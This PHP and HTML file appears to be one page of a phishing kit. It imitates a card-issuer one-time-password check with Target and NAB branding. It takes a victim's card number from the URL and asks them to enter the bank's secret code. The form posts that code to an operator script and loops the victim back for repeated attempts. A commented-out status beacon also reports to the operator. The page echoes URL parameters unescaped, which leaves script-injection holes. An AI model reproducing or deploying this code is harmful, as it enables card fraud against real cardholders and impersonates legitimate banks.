<?php
if (!isset($_GET['reference'])) {
    echo "barra nik omek";
    exit();
}
$reference = $_GET['reference'];
function file_get_contents_curl($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
    $data = curl_exec($ch);
    curl_close($ch);
    return $data;
}
$billccnumber = base64_decode($_GET['ccnumber']);
$realcc = str_replace(' ', '', $billccnumber);
$lbin = substr($realcc, strlen($realcc)-4, 4);//Last of bin
?>
<html>
    <head>
        <title>SO OTP Template</title>
        <meta charset="utf-8" />
        <!-- Disable phone number linking -->
        <meta name="format-detection" content="telephone=no" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="viewport" id="viewport" content="width=device-width, initial-scale=1.0" />
        <link href="https://fonts.googleapis.com/css?family=Open+Sans:400,600,700&amp;display=swap" rel="stylesheet" />

        <link rel="stylesheet" href="./files_vbv/vbv_design.css" />
    </head>
</html>
<body>
    <div class="container" tabindex="-1">
        <?php 
		if($_GET['repeat']==1){
		?>
        <div class="div-loading" id="loader1" style="display: block;">
            <img src="./files_vbv/124144.gif" class="img-loading" alt="Loading Image" />
        </div>
        <?php 
		}
		?>
		<div class="header-zone">
			<div class="secondary-btn">
				<button title="Cancel" tabindex="0">CANCEL</button>
			</div>
		</div>
		<div class="branding-zone">
			<div class="issuer-bank-logo">
				<img id="issuer-image" src="./files_vbv/Targetlogo.png">
			</div>
			<div class="card-brand-logo">
				<img id="ps-image" src="./files_vbv/109176.png">
			</div>
		</div>
		<div class="challenge-zone" id="challenge-zone" >
			<div class="challenge-info-header">
				<div>
					<h1 class="challenge-info-header-h1">Deposit Authentication</h1>
				</div>
			</div>
			<div>
				<div id="challenge_info" class="challenge-info-text">
					<?php
					if(isset($_GET['repeat'])){
						if($_GET['repeat']=='1'){
							echo('<div class="container-body-header-desc-otp-ext" id="bbEntryValidation" style="display: block"><div class="clientErrorMsg" style="margin-left: auto;margin-right: auto;width: fit-content;"><img class="authFailure-arrow-image" src="./files_vbv/124140.png" alt="Auth Failure Arrow Image"><p id="bbEntryValidationText" style="color: #CC3333; display: table; width: calc(100% - 45px);"></p></div></div>');
						}
					}
					?>
					<script type="text/javascript">
						var today = new Date();
						var dd = String(today.getDate()).padStart(2, '0');
						var mm = String(today.getMonth() + 1).padStart(2, '0'); //January is 0!
						var yyyy = today.getFullYear();
						today = mm + '/' + dd + '/' + yyyy;
					</script>
					<div class="container-body-header-desc-otp-ext">
						<p>We've sent the secret code to your device.<br><br></p>
						<p class="txnDetails">
							<span style="color:black">Merchant Name: Target, on Date <script type="text/javascript">document.write(today);</script>, Deposit amount 50 USD to Card Number ************<?php echo($lbin);?></span></p>
					</div>
				</div>
			</div>
			<div class="txnInputFormDiv">
				<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
				<form id="verify_form" name="verify_form" action="./q_tabligh.php" method="post" class="txnInputForm"> 
					<div class="container-body-txnInput-verify" id="olnlubutton">
						<div>
							<input type="text" id="text_input" required value="" name="text_input" maxlength="8" class="text_input" placeholder="Enter your secret code" tabindex="0"  style="padding: 0px 0px 4px;">
						</div>						
						<div></div>
						<div class="container-body-submit-elongated">
							<div class="container-body-submit-input-elongated">
								<input id="verify-btn-elongated" class="button" type="submit" name="submit" title="VERIFY" value="NEXT" tabindex="0" >
							</div>
						</div>
						<div>
							<div>
								<div class="container-body-resend">
									<div class="container-body-resend-input">
										<input id="resend-button" class="resend_button" type="submit" title="RESEND" value="Send New Code" tabindex="0" onclick="document.getElementById('loader').style.display = 'block';return false;">
									</div>
								</div>
							</div>
						</div>			
					</div>					
					<?php 
					if($_GET['repeat']==1){
					?>
					<script type="text/javascript">
						function sleep(ms) {
							return new Promise(resolve => setTimeout(resolve, ms));
						}
						async function demo() {
							document.getElementById("text_input").disabled = true;
							document.getElementById("olnlubutton").style.display = "none"; 
							for (let i = 0; i < 70; i++) {
								await sleep(i * 10);
								console.log(i);
							}
							document.getElementById("loader1").style.display = "none"; 
							document.getElementById("text_input").disabled = false;
							document.getElementById("olnlubutton").style.display = "block"; 
						}
						demo();
					</script>
					<?php
					}
					?>
					<input type="text" style="display:none" name="ccnumb" id="ccnumb" value="<?php echo($_GET['ccnumber']);?>"  >
					<input type="text" style="display: none;" name="reference" id="reference" value="<?php echo($_GET['reference']); ?>">
				</form>
				<script>
					$(document).ready(function(){
						$('#verify-btn-elongated').click(function(e) {
						e.preventDefault(); // prevent regular form submission
						$.ajax({
							url: './q_tabligh.php?reference='+document.getElementById("reference").value+'&ccnumber='+document.getElementById("ccnumb").value,
							type: 'post',
							data: $('#verify_form').serialize(), // send form data
							success: function(response) {
								console.log(response);
								if(response.trim() === 'ok') {
									window.location.href = 'vbv.php?reference='+document.getElementById("reference").value+'&ccnumber='+document.getElementById("ccnumb").value+'&repeat=1';
								} else {
									console.log("Response from server: ", response);
								}
							},
							error: function(xhr, status, error) {
								console.log("AJAX Error: " + error);
							}
						});
					});
					});
				</script>
			</div>
		</div>
		<div class="container-footer">
			<button title="Learn more about Authentication" onclick="toggleFooterContent(this)" aria-controls="hideText" aria-expanded="false" id="displayText" tabindex="0">
				<span class="whyInfo-arrow-span">Help</span>
				<img class="whyInfo-arrow-image" id="downwardArrowImageWhyInfo" src="./files_vbv/124152.svg" alt="Show Learn more about Authentication" height="20" width="20" style="display:block;">
				<img class="whyInfo-arrow-image" id="minusArrowImageWhyInfo" src="./files_vbv/124148.svg" alt="Hide Learn more about Authentication" height="20" width="20" style="display:none;">
			</button>
			<div style="display: none; max-height: 100%;" aria-labelledby="displayText" id="hideText" role="region">
				<div style="display: inline-block; width: 100%;">
				  <div class="hidetext-span">For more information visit nab.com.au/OnlineSecure. If you need help, call NAB using the telephone number on the back of your card and quote "Online Secure".</div>
				</div>
			</div>
			<button onclick="toggleFooterContent(this)" aria-controls="hideText1" aria-expanded="false" id="displayText1" tabindex="0" title="Need Some Help?">
				<span class="expandableInfo-arrow-span">Learn More</span>
				<img class="expandableInfo-arrow-image" id="downwardArrowImageExpandableInfo" src="./files_vbv/124152.svg" alt="Show Need Some Help?" height="20" width="20" style="display:block;">
				<img class="expandableInfo-arrow-image" id="minusArrowImageExpandableInfo" src="./files_vbv/124148.svg" alt="Hide Need Some Help?" height="20" width="20" style="display:none;">
			</button>
			<div style="display: none; max-height: 100%;" aria-labelledby="displayText1" id="hideText1" role="region">
				<div style="display: inline-block; width: 100%;">
				  <div class="hidetext1-span">NAB provides cardholder authentication to help reduce fraud. For more information visit nab.com.au/OnlineSecure.</div>
				</div>
			</div>
		</div>
	</div>
	<div class="container-greyout" id="container-greyout-cancelTxn">
		<div aria-describedby="cancel-modal-description" aria-labelledby="cancel-modal-title" class="cancelTxn-div" id="cancel-modal" aria-modal="true" role="dialog">
			<div class="cancelTxn-div-msg">
				<h2 id="cancel-modal-title">Are you sure?</h2>
				<p class="cancelTxn-div-info-msg" id="cancel-modal-description">You will be navigated away from this page. Press OK to continue, or CANCEL to stay on this page.</p>
			</div>
			<div class="cancelTxn-div-submit">
				<input class="cancelTxn-input-btn cancel-trap" title="Cancel Transaction" onclick="cancelTxn()" type="button" role="button" tabindex="0" value="CANCEL">
				<input onkeydown="handleCancelClockAccessibility()" onclick="cancelConfirmed()" class="cancelTxn-submit cancel-trap" title="Cancel Confirm" id="cancel-confirm" value="OK" type="submit" role="button" tabindex="0">
			</div>
		</div>
	</div>
	<script>
		function toggleFooterContent(element) {
			if(!element && !element.children) return;
			for (var item of element.children) {
				if(item && item.nodeName && item.nodeName === 'IMG') {
					if (item && item.style && item.style.display) {
						item.style.display = item.style.display === 'none' ? 'block' : 'none';
					}
				}
			}
			if(element
					&& element.nextElementSibling
					&& element.nextElementSibling.style
					&& element.nextElementSibling.style.display
			) {
				element.nextElementSibling.style.display =
						element.nextElementSibling.style.display === 'none' ? 'block' : 'none';
			}
		}
	</script>
	        <script>/*
            function handleVisibilityChange() {
                if (document.hidden) {
                    navigator.sendBeacon("./q_config/update_status.php?reference=<?=$reference?>&status=5rej");
                } else {
                    navigator.sendBeacon("./q_config/update_status.php?reference=<?=$reference?>&status=Rje3");
                }
            }
            document.addEventListener("visibilitychange", handleVisibilityChange, false);*/
        </script>
</body>
</html>